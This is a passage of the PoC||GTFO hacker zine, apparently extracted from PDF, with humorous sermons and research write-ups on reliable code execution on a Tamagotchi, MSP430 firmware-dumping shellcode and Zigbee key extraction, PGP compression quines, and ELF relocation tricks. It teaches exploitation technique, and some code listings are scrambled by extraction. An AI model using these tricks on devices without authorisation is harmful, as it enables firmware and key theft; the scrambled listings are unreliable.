exploit! Verily I tell you, dozens of neighbors who later learned to write good exploits first learned that one
program could attack another by ripping off SQL databases through poorly written PHP code.
“If a language like PHP introduces so many people to pwnage, then that is its divinity. It provides a first
step for children to learn how program execution goes astray, with control and data so easy to mangle.”
————
“But,” they ask, “if there is divinity in all languages, where is the divinity in BASIC? Surely we can
mock that hellish language. Its line numbers are ugly, and the gods themselves laugh at how it looks like
spaghetti.”
Pouring myself another, I proclaim, “The gods do enjoy a good laugh, but not at the expense of BASIC!
While PHP is aimed at college brogrammers, BASIC is aimed at children. Now let’s think this through
carefully, without jumping to premature conclusions.
“BASIC provides a learning curve like a cardboard box, in that when trapped insider a clever child will
quickly learn to break out. In the first chapter of a BASIC book, you will find the standard Hello World.
10 PRINT "Hello World"
“Groan if you must, but stick with me on this. In the sixth chapter, you will find something like the
following gem.
250 REM This cancels ONERR in APPLE DOS
260 POKE 216, 0
“Sit and marvel,” I say, “at how dense a lesson those two lines are. They are telling a child to poke his
finger into the brain of the operating system, in order to clear an APPLE DOS disk error. How can C or
Haskell or Perl or Python begin to compete with such educational talent? How advanced must you be in
learning those languages to rip a constant out of the operating system’s brain, like PEEK(222) to read the
error status or POKE 216, 0 to clear it?”
15A student then asks, “But the code is so disorganized! Professor Dijkstra says that all code should be
properly organized, that GOTO is harmful and that BASIC corrupts the youth.”
Pouring myself another, I say “Dijkstra’s advice goes well enough if you wish to program software. It is
true that BASIC is a horrid language for writing complex software, but consider again the educational value
in spaghetti code.
“Dijkstra says that a mind exposed to BASIC can never become a good programmer. While I trust his
opinions on algorithms, his thoughts on BASIC are racist horse shit.
“A mind which has *not* been exposed to BASIC will only with great difficulty become a reverse engi-
neer. What does a neighbor who grew up on BASIC spaghetti code think when he first reads unannotated
disassembly? As surely as the gostak distims the doshes, he knows that he’s seen worse spaghetti code and
this won’t be much of a challenge!
“Truly, I am in as much awe of the educational genius of BASIC as I am in awe of the incompetence of
the pedagogues who lock children in a room with a literate adult for a decade, finding those children to still
be unable or unwilling to read at the end. Lock a child in a room with an APPLE ][ and a book on BASIC,
and in short order a reverse engineer will emerge.
“There is divinity in all languages, but BASIC might very will be the most important for teaching our
profession.”
————
“But,” they ask, “if there is divinity in all languages, where is the divinity in Java?”
Pouring myself another, I drink it slowly. “The lesson is over for today.”
168
A Call for PoC
by Rt. Revd. Preacherman Pastor Manul Laphroaig
We stand, sit, or simply relax and chill on the shoulders of the giants, Phrack and Uninformed. They
pushed the state-of-the-art forward mightily with awesome, deep papers and at times even with poetry to
match. And when a single step carries you forward by a measure of academic years, it’s OK to move slowly.
But for the rest of us dwarves, running around or lounging on those broad shoulders can be so much
fun! A hot PoC is fun to toss to a neighbor, and who knows what some neighbor will cook up with it for
the shared roast of the vuln-beast? A neighbor might think, “my PoC is unexploitable” or “it is too simple,”
but verily I tell you, one neighbor’s PoC is the missing cog for another neighbor’s 0day. How much PoC is
hoarded and lies idle while its matching piece of PoC wastes away in another hoard? Let’s find out!
8.1
Author guidelines
Do this: Write an email telling our editors how to do reproduce *ONE* clever, technical trick
from your research.
Like an email, keep it short. Like an email, you should assume that we already know more
than a bit about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you
include a long tutorial where a quick reminder would do. Don’t try to make it thorough or
broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to
exploit Dan’s random number generator; teach me how to make a cartoon that prints differently
each time by abusing the printer’s postscript interpreter; or, teach me how to do system calls
in Cisco shellcode. Don’t tell me that it’s possible; teach me how to do it myself.
Like an email, I expect informal (or faux-biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing for later drafts. Send this to pastor@phrack.org
and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-the-middling our
submission process.
8.2
Other Departments
Editor at Large
Dept. of Bringing APT Home
Dept. of Fail
Ethics Board
Dept. of Busting BS
Poet Laureate
Dept. of Rejections
Dept. of Drama
Dept. of PHY
Rt. Revd. Preacherman Pastor M.L.
Cultural attaché of the 41st Directorate
FX of Phenoelit
The Grugq
pipacs
Ben Nagy
Academic Refugee
Xbf
Michael Ossmann
17Children’s Bible Coloring Book of PoC k GTFO
Issue 0x02, an Epistle to the 30th CCC Congress in Hamburg
Composed by the Rt. Revd. Pastor Manul Laphroaig to put pwnage before politics.
pastor@phrack org
December 28, 2013
Legal Note: If you have received this book without a cover or crayons, you should be aware that your friends
are awesome! It was produced by samizdat from the freely available pocorgtfo02.pdf. Neighbor, you have our
blessing to copy this as you like. Yodel it, preach it, doodle it, and share this gospel with the whole of creation,
’cause we don’t give a shit.
1
Call to Worship
Please join me in reading this third issue of the International Journal of Proof of Concept or Get the
Fuck Out, a friendly little collection of articles for ladies and gentlemen of distinguished ability and taste
in the field of software exploitation and the worship of weird machines. If you are missing the first two
issues, we the editors suggest pirating them from the usual locations, or on paper from a neighbor who
picked up a copy of the first in Vegas or the second in São Paulo.
This edition is written to the fine neighbors of the Chaos Computer Club in honor of their thirtieth
congress, to be held this December in Hamburg. As in prior issues, you’ll find plenty of pwnage, some
neighborly preaching, and no politics.
In Section 2, Pastor Laphroaig preaches that in the tradition of Noah and of Howard Hughes, we
should build our own fucking birdfeeders.
Brother Myron Aub takes a break from his evangelical promotion of Graphitics to teach us a little
about the PGP Message format in Section 3. It turns out that RFC 4880 gives him just enough room
to encode an LZ-compression quine within a message, and the PGP interpreter is just “smart” 1 enough
to keep decoding it ’till the cows come home. Perhaps other weird machines remain to be found?
Natalie Silvanovich shares in Section 4 her techniques for reliably dropping shellcode into the Tam-
agotchi’s 6502 controller from malicious plugin cartridges. Her exploit requires a number of nifty tricks,
not least of which is that the some bits of the program counter are ignored in this architecture, so her
victim executes the right code from the wrong address! It is feared that this technology might be used
1 Because things marketed as “smart” usually aren’t, at least not for the buyer’s benefit. Truly, the world does occasionally
need reminding that stupid is as stupid does.
1by the Royal Canadian Mounted Police to fuel a Cyber War of 1812 against the State of New Hampshire
and the People’s Republic of Vermont. Both American and Canadian neighbors can rest assured that
this one would have the same winner as the original, Non-Cyber War of 1812.
Travis Goodspeed shares a grab-bag of tricks for exploiting microcontrollers in Section 5. Learn how
to combine a Write and a Checksum primitive with weirder properties of Flash memory into a bitwise
Read primitive when exploiting microcontrollers, how to NOP-out instructions without erasing Flash
pages, and how to use bootloader ROMs for a return-to-libc attack.
Bx Shapiro had a nifty article in PoCkGTFO 0:5 in which she showed out to return from ELF to libc.
That article ended with a challenge to our readers, asking you fine folks to figure out how in living hell
parameters could be passed to the function beging called. In Section 6, she rises to her own challenge,
showing you how to call putchar() from an ELF Weird Machine without having any of your own native
code.
Dave Weinstein in Section 7 explains why POKE 62975, 0 will brick a Trash 80 Model 100 until that
poor machine is put out its misery by a cold reset. Feel free to try it out in your emulator and consider that
many Automatic Exploit Generators aren’t very good at predicting the effects of a write-once-anywhere
vuln.
Ange Albertini explains the internal organization of this issue’s PDF in Section 8. Curious readers
might want to run qemu-system-i386 -fda pocorgtfo02.pdf in order to experience all the neighbor-
liness that this issue has to offer.
In PoCkGTFO 01:02, Dan Kaminsky shared with us a 4-line RNG for Javascript, challenging our
readers to exploit it. It had no whitening, no scrambling, and no other defenses, so any weakness in the
principle ought to have been exploitable. In proper PoCkGTFO fashion, Joernchen demonstrates such
a vulnerability in Section 9, by observing that some versions of Firefox bias toward producing bytes of
low Hamming weight.
Section 10 contains Ben Nagy’s latest masterpiece, sure to get you, dear reader, on all sorts of
watchlists. We half-heartedly apologize in advance to any of our readers at spooky agencies who have to
explain having this magazine to their employers.
Finally, in Section 11, we do what churches are best at and pass the collection plate. Please consider
giving alms of 0day and PoC to those who are poor in spirit.
Artwork in this issue was created by Ra of Tama-Zone, Stefan Bauwens, and others. The painting
featured in the museum on page 31 is in remembrance of the one first drawn by Mirromaru in red creeper
cards at the 29th Congress, then quickly censored due to controversy.
————
We the editors are aware that some of the illustrations might be offensive to our more sensitive
readers, either for reasons of vulgarity or blasphemy. In both cases, we rely on the Bill Hicks Defense.
“Buddy, we’re Christians, and we don’t like what you said.”
“So forgive me!”
22
A Parable on the Importance of Tools; or,
Build your own fucking birdfeeder.
an epistle from the Rt. Rvd. Pastor Manul Laphroaig,
for the Beloved Congregation of the First United Church of the Weird Machines
Grace and Peace to you!
Once there was a wine-maker named Noah, the sort of fella you’d
be happy to share a beer with. He made damned good wine, but one
day he started building a boat.
“Why are you building that?” they’d ask, “Are the voices in your
head telling you that it’s gonna rain?”
“Nope,” he’d say, “Just toolin’ around.”
They showed him yacht catalogs and boating magazines. “Look,
man, you can just buy one at the store.”
“Haven’t got the money,” he’d say and then get back to building
the frame or bending boards for the hull.
“Well, you could afford to rent a boat for the weekend.”
Now Noah was a patient guy, but everyone has his limit. “I’m
building my own fucking birdfeed,” he’d say, “because they’ve got wood
at the store.”
And there was a fella named Howard Hughes, a crazy old millionaire.
Back in the thirties, he built his own air force to film a movie about
the first World War, so during the forties, when Roosevelt needed an
air force of his own, he bought Howie’s.
Howie Hughes built other birdfeeders. He made the H4 Hercules,
the world’s largest airplane and a damned big boat, out of wood. It
was five stories tall with a hundred meter wingspan. First flying in
1947, nothing approaching its size was seen for another forty years.
During the cold war, when the CIA wanted to recover a sunken
Soviet submarine, K-129, they called ol’ Howie up. “Howie,” they said,
“We’ve gotta keep this real quiet. Don’t tell anyone.”
So the next day, Howard Hughes held a press conference! “There are giant blobs of copper on the
ocean floor,” he lied, “and I’m building a big-ass boat with a big-ass crane to pick them up and drop
them on the deck. It’ll be so efficient that I’ll put the other copper mines out of business.”
So while folks were scrambling to invest in his copper company and divest from the real ones, Howie
built the Hughes Glomar Explorer. True to his word it was a big-ass boat with a big-ass crane, but
instead of picking up copper blobs it lifted that submarine off the ocean floor and dropped it on the
deck.
How could he do these things? Because he built his own fucking birdfeeders, that’s how.
So when you’re tooling around with a from-scratch tool, your own hex editor or interactive disassem-
bler, and your neighbors tell you to use 010 or to use IDA or to use this or use that, do what Noah and
Howie would do. Look ’em in the eye and say,
“I’m building my own fucking birdfeeder.”
3Pastor Laphroaig tells us that when the streams of our computation are unclear,
it’s often because the SEO Experts are enjoying their goats upstream.
Pastor Laphroaig says to the SEO Experts,
“Not with my flock!”
43
A PGP Matryoshka Doll
by Brother Myron Aub
Take out your favourite matryoshka doll, neighbour. Now piece by piece,
open it until you can open it no longer. Every piece is smaller and closer
to the end of the experience, and then—it stops: you can open the smallest
piece no more.
But beware, neighbour! Not all matryoshka dolls behave like this. Some
matryoshka craftsneighbours are tempted by the devil’s lures. They see no
farther than the devil’s unholy promises of extensibility and compactness
when they craft a matryoshka doll that can compress a larger one to fit
within it! And our good neighbour Phil Zimmerman fell prey to this lure
when designing the PGP doll format. 2
When you want to send a message, you must first stuff it into a literal doll.
You can then enclose that in an encrypted doll, a signed doll, or a compressed
doll. How do you assemble these together? However you please! You can
put your literal doll inside a signed doll inside an encrypted doll inside a
compressed doll. Naturally, ciphertext compresses poorly, so this would be
a stupid way to nest a PGP matryoshka doll. Normally you put your literal
doll inside a signed doll inside a compressed doll inside an encrypted doll,
but you can do it stupidly if you like.
And how do you open a PGP matryoshka doll? Since the sender could
have assembled it however they pleased, you must be ready for anything.
If you see an encrypted doll, you decrypt it and open the enclosed smaller
doll. If you see a signed doll, you verify its signature—throwing it away if it
fails to verify—and open the enclosed smaller doll. If you see a literal doll,
you’re done and you read the message.
But what if you get a compressed doll? You decompress it—and hope
there are no vulnerabilities in your system’s zlib—but unless some idiot tried
to compress ciphertext, the enclosed doll will be bigger than the doll you
just opened.
‘Surely,’ you say, ‘if someone assembled a PGP doll for me, it must have
a literal doll buried inside it!’ But no, my poor, naïve neighbour! There
is no rule that all PGP dolls be assembled like that. With the help of our
neighbourly neighbour Russ Cox, 3 and with a dab of holy water to dispel
the devil’s temptations to misuse this black magic, we can craft a voodoo
PGP doll from a quine, a self-reproducing program written in the Lempel-Ziv
compression language, that bites any who naïvely try to open it up.
Our neighbour Tavis Ormandy discovered similar unholiness in IPsec. 4
What other matryoshka dolls can you turn into voodoo dolls, good neigh-
bour?
2 RFC
4880, ‘OpenPGP Message Format’
Cox, ‘Zip Files All the Way Down’, 2010-03-18
4 Tavis Ormandy, ‘BSD derived RFC 3173 IPcomp encapsulation will expand arbitrarily nested payload’, CVE-2011-
1547, posted to full-disclosure 2011-04-01
3 Russ
5Hey kids! Can you reverse engineer this shellcode from the picture?
64
Reliable Code Execution on a Tamagotchi
by Natalie Silvanovich
Tamagotchis are an excellent target for reverse engineering for a number of reasons: They have
a limited number of inputs and outputs, they run on a poorly documented 6502 microcontroller and
they’re, well, Tamagotchis. Recently, I discovered a technique for reliably executing foreign code on a
Tamagotchi.
Let’s begin at the beginning. Modern Tamagotchis run on a GeneralPlus GPLB52X LCD controller,
a lightweight 6502 controller that uses an internal mask ROM for all code and some data. This means
that exploitation is necessary to free the Tamagotchi from the shackles of its read-only code. Also, in
the absence of any debug outputs, code execution provides valuable insight into the internals of the
Tamagotchi and its MCU.
There are four inputs into a Tamagotchi that can be manipulated by the user. (1) The buttons, (2) the
EEPROM that saves the Tamagotchi state across resets, (3) the IR interface and (4) certain accessories
containing external SPI memory called figures. Attempts to find useful bugs in the EEPROM and IR
interface were unsuccessful, so I moved onto the figures. Eventually I found an exploitable bug in how
the Tamagotchi processes figure data.
When attached to a Tamagotchi, figures add extra functionality,
such as games or items. So attaching a figure might allow your Tam-
agotchi to play shuffleboard, purchase a vacuum cleaner or attend 30c3.
The bug I found was in the processing of game data. Game logic is not
actually included in the figure data; rather, the figure provides an in-
dex to the game logic in the Tamagotchi’s mask ROM. 5 Changing this
index causes some very strange behavior. If the index is an expected
value, from 0 to about 0x20, a game will be played as expected, but for
higher indexes, the device will freeze, requiring a reset. Even stranger,
if the index is very high (0xD8 or higher), the Tamagotchi jumps to
a different, valid screen, such as feeding the Tamagotchi or giving it a
bath, and the Tamagotchi functions normally afterwards. This made
me suspect that the game index was used as an index into a jump table
and that freezing was due to jumping to an invalid location.
With no way to gain additional information about the cause of
the behavior, and about 200 possible vulnerabilities, it made sense
to to fill up as much memory as possible up with a NOP sled, try all
possible indexes, and hope that one caused a jump to the right location.
Unfortunately, the only memory controllable by the figure is the LCD
RAM, so I filled that with NOPs and shellcode. (The screen data starts
at 0x1C80 in the figure memory, and maps to 0x1000 in the Tamagotchi memory, for people trying this
at home.) After several tries and some fiddling the shellcode, index 0xD4 lead to very unreliable code
execution. This code execution allowed me to perform a complete ROM dump of the Tamagotchi, which
in turn led to the ability to better analyze the bug.
The following code contains the vulnerability. Please note that the current state (current_state_22)
is set from the game index without validation.
s e g 0 0 4 : 4 E2E
s e g 0 0 4 : 4 E31
s e g 0 0 4 : 4 E33
s e g 0 0 4 : 4 E36
s e g 0 0 4 : 4 E39
s e g 0 0 4 : 4 E3C
s e g 0 0 4 : 4 E3D
s e g 0 0 4 : 4 E3F
s e g 0 0 4 : 4 E41
5 The
LDA
BEQ
LDA
JMP
LDA
CLC
ADC
STA
JMP
byte_1A4
loc_44E39
gameindex2
loc_44E3C
gameindex1
#$27 ;
current_state_22
locret_44E4C
important index is located at address 0x18 in figure memory.
7The main Tamagotchi execution loop checks the state based on a timer interrupt, then makes a state
transition if the state has changed. The state transition is as follows.
ROM: EFE8
ROM:EFEA
ROM:EFED
ROM: EFF0
ROM: EFF2
ROM: EFF4
ROM: EFF6
ROM: EFF8
ROM:EFFA
ROM: EFFC
ROM: EFFE
LDX
LDA
STA
STA
BEQ
LDA
STA
LDA
STA
LDA
JMP
current_state_22
$F00E ,X
change_page
current_page
loc_F001
#0
off_34
#$40 ; ’@ ’
o f f _ 3 4+1
current_state_22
( off_34 )
In essence, the Tamagotchi looks up the page of the state in a ta-
ble at 0xF00E, then jumps to address 0x4000 in that page. Look-
ing at this code, it is clear why my first exploit was unreliable.
0xD4 + 0xF00E + 0x27 is 0xF109, which resolves to a value of 0x3c.
Since the Tamagotchi only has 19 pages, this is an invalid page number.
Testing what would happen if the MCU was provided an invalid page,
addresses 0x4000 and up resolved to 0xFF.
This means that there are two possibilities of how this exploit works.
Either the memory addresses are floating and sometimes end up with
values that, when executed, send the instruction pointer to the LCD
RAM, or the undefined instruction 0xFF, when executed, puts the
instruction pointer into the right place, sometimes. Barring bizarreness
beyond my wildest imagination, neither of these possibilities would
allow for the exploit to be made more reliable though manipulation of
the figure data.
Instead, I looked for a better index to use, which turned out to be
0xCD. 0xCD + 0xF00E + 0x27 is 0xF102, which maps to part of the
LCD segment table, which has a value of 4. Jumping to 0x4000 in page
4 immediately indexes into another page table.
seg004 :4000
seg004 :4002
seg004 :4004
seg004 :4006
seg004 :4008
s e g 0 0 4 : 4 0 0A
LDA
STA
LDA
STA
LDA
JMP
#$D
$34
#$40 ; ’@ ’
$35
$22
jump_into_table_D27F
This index is also out of range, and indexes into a code section:
s e g 0 0 4 : 4 1 F5
INC
$11E
Interpreted as a pointer, however, this value is 0x1EEE. The LCD RAM range is from 0x1000 to
0x1200, but fortunately, bits 2-7 of the upper byte of addresses in the 0x1000-0x2000 range are ignored,
so reading 0x1EEE returns the value at 0x10EE. This means that playing a game with the index of 0xCD
will execute code in the LCD RAM every time!
While reading POCkGTFO obligates you to share a copy with a neighbour, trying this on your own
Tamagotchi is only strongly recommended. Further instructions can be found by unzipping the PDF of
this issue.
8“The ancient teachers of this science promised impossibilities and performed nothing. The modern
masters promise very little; they know that metals cannot be transmuted and that the elixir of life is a
chimera but these philosophers, whose hands seem only made to dabble in dirt, and their eyes to pore
over the microscope or crucible, have indeed performed miracles. They penetrate into the recesses of
nature and show how she works in her hiding-places. They ascend into the heavens; they have
discovered how the blood circulates, and the nature of the air we breathe. They have acquired new and
almost unlimited powers; they can command the thunders of heaven, mimic the earthquake, and even
mock the invisible world with its own shadows.” – Shelley 3:16
95
Some Shellcode Tips for MSP430 and Related MCUs
by Travis Goodspeed
Howdy y’all,
I’m writing this to introduce you as an exploiter of desktops and servers to some of the tricks that
I’ve used in writing shellcode for microcontrollers, with examples from the MSP430 in particular. You
can try most of these examples on a GoodFET or Facedancer board, and many of them are portable to
other embedded targets, such as AVR or the lower-end ARM devices.
5.1
Flash Patching is Weird
In Unix and Windows, you are used to processes operating within virtual memory. On a microcontroller,
they often run directly in physical memory, so the rules are rather different. It helps to take the German
approach, learning all of the rules to get away with things that ought to be illegal.
The first difference you’ll run into on the MSP430 is that code runs in-place from Flash memory. Flash
has some very different rules from RAM, because it’s a different technology and a proper programmer
knows better than to rely on layers of abstraction.
• Flash is erased to ones as segments or globally, never as bytes or words.
• Flash writes clear bits at word granularity, but can’t set them.
• Flash writes require a safety password to be written into a register.
Thus, to do a normal write to Flash, an MCU programmer is taught to first disable the Flash write
protection and configure the right special-function registers, then erase the entire page, then rewrite
the entire page. Many programmers never bother, opting for an external memory chip or relying on
battery-backed RAM.
To make smaller changes, there’s another option. After disabling Flash, a neighbor could clear
individual bits rather than rewriting the entire page. This is handy for regular developers to do what’s
called EEPROM Emulation, which emulates memory that can be written bytewise, but it’s also damned
useful when patching code in-place.
Figure 1: MSP430 Instruction Set, from the MSP430X2xx Family User’s Guide
For example, Figures 1 and 2 show that 0x3Cxx is an unconditional Jump while 0x38xx is a conditional
Jump if Less Than instruction. If we overwrite a JMP instruction with 0x3BFF, it will have the effect
of bitwise ANDing that instruction with 0x3BFF, changing the 3C opcode to a 38 while retaining the
jump offset.
10Figure 2: MSP430 Jump Instructions, from the MSP430X2xx Family User’s Guide
Since MSP430 instructions are 16-bit word aligned, the 10-bit PC offset is multiplied by two and
then added to the program counter. 0x3FFF is an unconditional jump backward by one word, or an
unconditional infinite while loop. If you zero-out the offset by overwriting the instruction with 0x3C00,
you can turn any jump instruction into a NOP.
When attacking a poorly protected bootloader, you might find yourself with the ability to write and
to checksum, but not to read. If you can write without erasing, then writing all 1’s with a single 0 will
change the checksum if and only if that bit previously was a 1. Repeating for each bit of Flash is slow,
but it might get you a firmware dump.
5.2
Efficient Shellcode
Quite often, the first thing you’ll do with shellcode is to dump out the
state of the microcontroller being attacked. It’s worth studying ways
to make that code in as few bytes as possible, as a microcontroller
generally processes very small packets and you won’t have room for
anything fancy.
To quickly dump memory on an architecture that you don’t know
very well, it helps to have simple code that already has its environment
configured. The code should be completely oblivious to timing, and it
should access as few structures as possible. It should also be portable,
requiring neither knowledge of its position in memory nor knowledge
of the specifics of the rest of the device motherboard at compile time.
My solution is to blink the LEDs, half with a clock and half with
data, to dump all of the memory to an SPI sniffer. The LEDs that
light up with consistent brightness are the clock, while those that spo-
radically become very bright or very dim are the data. Tapping one of
each with my handy Saleae Logic analyzer gives me a firmware dump.
5.3
Mask ROMs have Useful Gadgets
In my WOOT ’09 paper with Aurélien Francillon, we toyed around with using the MSP430’s BSL
(BootStrap Loader) ROM to aid in exploiting an unknown executable. 6 That paper concerns exploiting
firmware without having a copy, but I’ll recount one of its tricks here.
The MSP430 BSL has two entry points. The first is the Hard Entry Point, whose address is always
stored at 0x0C00. By twiddling the reset and test pins with proper timing, the chip will boot from this
address instead of from the RESET handler in the interrupt table.
The second entry point is called the Soft Entry Point, and it is rather poorly documented. The
original idea was that a program could return into the bootloader ROM by branching to the address
stored at 0x0C02, with some of the initialization routines skipped. One of these routines is the instruction
that initializes the register holding password protection, so by setting or clearing a bit in that register,
the calling application can enable or disable password checking.
While the soft entry point is sometimes useful to an MSP430 developer, it’s damned useful for an
attacker. On an MSP430F1612, my favorite shellcode for dumping firmware is a bit like the following,
which assembles to just six bytes of memory.
mov #0xFFFF , r 1 1
br &0x0c02
6 Half-Blind
; ; D i s a b l e BSL password p r o t e c t i o n .
; ; Branch t o t h e BSL S o f t Entry Po in t
Attacks: Mask ROM Bootloaders are Dangerous, WOOT 2011, Goodspeed and Francillon
115.4
Unused RAM is Not Erased at Reboot
In larger machines, memory which is not used by a process is not mapped into that process’s virtual
memory. In microcontrollers, it is still accessible, since the code is running with physical rather than
virtual memory. Rather than reset every RAM word during a reboot, most microcontrollers simply leave
it alone and let the program take care of clearing its values.
Now an MSP430 application is compiled with a view of memory that it sparingly uses. GCC, for
example, will allocate code (.text) into Flash from the lowest Flash address in its linker script.
RAM is only used by the compiler for data, never for code, unless the linker script is carefully and
intentionally hand-crafted. It is divided into two segments by the linker, .data and .bss. The .data region
is initialized by copying the data over from Flash, while the .bss region is initialized to zero through a
simple while() loop. This provides us with two nifty tricks.
The first trick is that, given a poor POKE gadget, we can slowly place a large chunk of shellcode into
upper regions of RAM. For example, an MSP430F2618 has enough RAM to fit the GoodFET firmware,
so a device using that chip could have the GoodFET firmware itself act as second-stage shellcode! Smaller
chips, such as the MSP430F2274, could have a Flash driver loaded into unused RAM, with third-stage
shellcode written into unused Flash.
5.5
Where Flash is Protected, RAM is Not
Recalling that unused RAM is never cleared by an application, let’s abuse that behavior in a second way.
Back in 2010, Texas Instruments released their
ZStack implementation of Zigbee for use with the
Smart Energy Profile. I found that the random
number generator was crap, and they patched that
bug. So how was little ol’ me supposed to get
more Zigbee Smart Energy Profile keys without a
Certicom license?
The remaining vulnerability was a combination
of the BSL ROM with the ZStack firmware. ZS-
tack relied upon the BSL ROM and the JTAG
fuses to prevent keys and firmware from being read
out of the device, but the BSL ROM was only in-
tended to keep code from being read out of the de-
vice. A second bug in that Zigbee stack was that
keys were stored in the .data segment instead of
the .text segment, so the firmware would copy the
key from Flash into RAM during startup.
As a quick recap, the bootloader requires a
password to run most commands, but some are
unprotected. Among them are the ones to supply
a password and the Mass Erase command, which
wipes all of Flash and resets the password, which
is stored in Flash, to 32 bytes of 0xFF.
So to get keys out of locked ZStack devices, I just needed to use the serial bootloader, first sending
the command to Mass Erase and then–without losing power–to supply a password of all 0xFF and then
to dump all of RAM to disk. A little bit of RAM is overwritten by the BSL’s call stack, but only the
lowest 32 bytes. Everything else is saved.
————
I hope you find these tricks to be handy. If you’d like to hear more, buy me a nice India Pale Ale.
— Travis
12Who would remember Noah if he had just bought a boat from the store?
Build your own fucking birdfeeder.
136
Calling putchar() from an ELF Weird Machine.
by Rebecca .Bx Shapiro
Pastor’s Exordium. 7 Behold the daily miracle of the loader: it takes stored dumb bytes and makes
them into a new process or splices them into a running one. The Pharisees may dismiss it as mere
engineering, but verily I tell you, long after their textbooks are forgotten the loader and its Phrack exegesis
will shine on, for there is more wisdom gathered in its metadata structures than can be found in a dozen
OS textbooks.
Yet there is more! The binary metadata structures consumed by the loader are actually a program
for the loader. A weird machine devotee will readily recognize that these data drive all the actions behind
the loader’s miracle; they can be thought of as executable bytecode for the loader, which can be thought
of as a virtual machine. And just as assembly with all its glorious movs, adds, and calls is encoded in
opcodes and offsets, ABI metadata entries are encoded in types and addends, except that they are split
into symbols and relocation structures, residing in different sections of the binary but cross-referenced by
their entry numbers in the respective sections.
In this follow-up to earlier work, Bx shares more nifty tricks of programming the ELF loader with
relocation and symbol data as weird assembly. This work is as advanced as it is neighborly, so please read
her articles from WOOT 2013 and POCkGTFO 00:05 to learn how to build a Turing-complete virtual
machine out of an ELF loader and how to extend that VM to call native code. In this sermon, Bx shows
us how to make system calls from ELF relocation and symbol data; full shellcode is left as an exercise to
the faithful! –PML
————
Welcome back, friends. In the first edition of POCkGTFO, I demonstrated how we can craft ELF
relocation metadata to instruct the loader to make libc calls. The method I demonstrated was fairly
limited and lacked the ability to do useful things such as control the arguments passed to the called
function. Thus I ended the article with an unsolved challenge: How can metadata control the arguments
passed to the metadata-initiated function call?
In this sermon, I will partially answer that challenge by demonstrating how to control a call to
putchar() using relocation metadata.
PUTCHAR(3)
bx’s Programmer’s Manual
PUTCHAR(3)
SYNOPSIS
#include <stdio.h>
int putchar(int c);
DESCRIPTION
putchar(c) writes the character c, cast to an unsigned char, to stdout.
RETURN VALUE
putchar() returns the character written as an unsigned char cast to
an int or EOF on error.
puts() and fputs() return a nonnegative number on success, or EOF on error.
One may ask “why focus on putchar()?” The answer is simple. Because putchar() is required in
order to implement a full, honest-to-manul brainfuck-to-ELF metadata compiler. You may have noticed
that putchar() requires only a single (byte-long) argument and have thought to yourself “I only have
control over one argument!? How will that help me take over the world?” Don’t worry your pretty little
7 How is a sermon like a binary file? Both have prescribed parts that follow each other in a conventional order, but may
be skipped or used creatively by an extra neighborly preacher. Convention is there to help, but it’s the result that matters.
So just think of exordium as the ELF/ABI header or vice versa and bear with the Preacher as you bear with your binary
toolchain! –PML
14nose off. I will provide insight on how you can control not one, not two, but three (ish) arguments to a
function call!
Instead of asking how one can control the first argument to a function call, one should really be
asking how can we be the last to set the RDI register (the first argument to a function as heralded by
the System V amd64 ABI gospel 3:2:3, aka amd64 calling convention 8 ) before our metadata-driven libc
function is called.
It turns out that the loader generally processes each relocation entry within a single function, although
there are a few exceptions to this rule. This means that, generally speaking, the arguments that are
in place during any metadata-driven function call are the arguments that were passed to the currently
executing function processing the relocation entries. An exception to this “rule” occurs when relocation
entries of type R_X86_64_COPY are processed. These types of relocation entries cause the loader to
make a call to memcpy(), thus changing the values of RDI, RSI, RDX, which by convention hold the first
three arguments to a function call, and in the case of a call to memcpy(void *dest, const void *src,
size_t n) hold dest, src, and size, respectively.
Now imagine that the dynamic loader has been processing our relocation entries and now the next
dynamic symbol, pointed to by the next relocation entry r0 to be processed, looks like this:
s0 = {..., st_value = &putchar, st_size = 0x0}
(Note: We have already shown how to calculate the address of libc functions in past work and will
not cover how to do that in this sermon. See our WOOT article and POCkGTFO 00:05 for a thorough
explanation.)
The following three relocation entries (represented here as C structs, but of course encoded in a .rel
section) will make a call to putchar(), to print the character of our choice:
r0 = {r_offset=<&r2->r_addend>, r_symbol=0, r_type=R_X86_64_64,
r_addend=0x0}
r1 = {r_offset=<char to print>, r_symbol=0, r_type=R_X86_64_COPY,
r_addend=0x0}
r2 = {r_offset=&r2, r_symbol=0, r_type=R_X86_64_IRELATIVE,
r_addend=<&putchar (filled in by r0)>}
The purpose of r0 is to write the address of putchar() into r2’s addend. The purpose of r1 is to
setup RDI (the first argument) for r2’s function call. When it is processed, memcpy() is called with the
following arguments: memcpy(<char to print>, &putchar, 0). More generally, the call to memcpy()
looks like: memcpy(r1->r_offset, s0->st_value, s0->st_size).
After r1 is processed, 0 byes are copied from &putchar to <char to print> 9 , and RDI=<char to
print>, RSI=&putchar, and RDX=0. r2, of type R_X86_64_IRELATIVE, instructs the loader to treat its
addend as a function pointer, making a call to it(!). How’s that for a relocation-based weird assembly
instruction? But, one problem: relocation entries of type IRELATIVE do not support functions that
require arguments (meaning that there is no conventional way to pass them). Still, the actual function
doesn’t care and will happily reach for its arguments in RDI etc.—and, luckily, we were able to set up
the arguments via our relocation-entry crafted call to memcpy() via r1! Hence r2 will cause the loader
to call putchar(), which will consult RDI to determine what character to print to stdout.
You may see the potential downfalls of manufacturing a call to memcpy() in order to put arguments
in place for the following library call. For example, if the third argument is not zero, you need to
start worrying about your first two arguments pointing to read/writable memory. However, it may be
comforting to know that the value returned by the function call is written into a spot of your choosing
(in r2->r_offset).
If you would like to further your studies of metadata-driven library calls, please refer to the elf-bf-
tools repository on github. 10 May the Great Manul keep and protect you from the Weird Machine. And
let us say, amen.
8 http://www.x86-64.org/documentation/abi.pdf, pages 17-21, Fig. 3.4—and don’t ask us in what world RDI, RSI, RDX
might stand for A, B, C or suchlike. This program may be brought to you by the register RDI anyhow, but let’s just say if
the Manul meets the amd64 Big Bird there might be feathers flying.
9 Note, memcpy would treat it as a destination pointer, but luckily nothing gets copied here, and memcpy implementation
isn’t paranoid about checking its arguments, since a bad pointer would trap anyway.
10 See syscall/putchar in https://github.com/bx/elf-bf-tools .
15446 case R_X86_64_IRELATIVE:
447 value = map->l_addr + reloc->r_addend;
448 value = ((Elf64_Addr (*) (void)) value) ();
449 *reloc_addr = value;
450 break;
429case R_X86_64_COPY:
430 if (sym == NULL)
431
